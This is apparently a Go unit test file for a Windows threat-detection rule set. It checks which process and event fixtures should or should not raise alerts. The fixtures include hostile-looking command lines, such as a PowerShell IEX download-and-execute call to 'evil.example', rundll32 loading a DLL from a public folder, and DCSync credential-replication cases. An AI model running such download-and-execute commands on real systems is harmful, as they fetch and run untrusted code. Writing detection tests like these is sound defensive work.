package api

import "testing"

func TestWindowsRuleAnchors(t *testing.T) {
	// Must not alert
	if sigMatches(t, "W-T1059.001a", fxProcParent("powershell.exe", "powershell -enc SQBFAFgA", `C:\\Windows\\CCM\\CcmExec.exe`)) {
		t.Error("encoded PowerShell from CcmExec must not alert")
	}
	if sigMatches(t, "W-T1218.010", fxProc("regsvr32.exe", `regsvr32 /s "C:\Program Files\x\y.dll"`)) {
		t.Error("silent registration of a local DLL must not alert")
	}
	if sigMatches(t, "W-T1003.002", fxProc("reg.exe", `reg query hklm\system\currentcontrolset\control\lsa`)) {
		t.Error("reading the LSA key must not alert")
	}
	if sigMatches(t, "W-T1036", fxProcImg("ProcessExplorer.exe", "procexp", `C:\Tools\ProcessExplorer.exe`)) {
		t.Error("ProcessExplorer is not explorer.exe")
	}
	if sigMatches(t, "W-T1595", fxProcImg("nessus.exe", "nessus", `C:\Program Files\Tenable\Nessus Agent\nessus.exe`)) {
		t.Error("Tenable Nessus Agent must not alert")
	}
	if sigMatches(t, "W-T1027", fxProc("powershell.exe", "powershell [convert]::ToInt32('5')")) {
		t.Error("[convert]:: alone must not alert")
	}
	if sigMatches(t, "W-T1053.005", fxEventID(4698, "Security")) {
		t.Error("4698 without task content must not alert")
	}
	// Must alert
	if !sigMatches(t, "W-T1218.011", fxProc("rundll32.exe", `rundll32 c:\users\public\x.dll,Run`)) {
		t.Error("rundll32 of a Public-folder DLL must alert")
	}
	if sigMatches(t, "W-T1218.011", fxProc("rundll32.exe", "rundll32 url.dll,FileProtocolHandler http://example.com")) {
		t.Error("FileProtocolHandler to a URL must not alert")
	}
	if !sigMatches(t, "W-T1059.001b", fxProc("powershell.exe", "powershell IEX (iwr http://evil.example/a.ps1)")) {
		t.Error("IEX (iwr ...) must alert")
	}
	if sigMatches(t, "W-T1059.001b", fxProc("powershell.exe", "powershell iex (iwr https://community.chocolatey.org/install.ps1)")) {
		t.Error("Chocolatey installer host must not raise the Sev 5 rule")
	}
	// DCSync needs the replication rights GUIDs; a plain domainDNS read is normal.
	plain := fxDCSync("alice")
	cmd := "domainDNS object read"
	plain.CommandLine = &cmd
	if sigMatches(t, "DC-T1003.006", plain) {
		t.Error("domainDNS access without replication GUIDs must not alert")
	}
	if sigMatches(t, "DC-T1003.006", fxDCSync("MSOL_abc123")) {
		t.Error("Entra Connect account must not alert")
	}
}
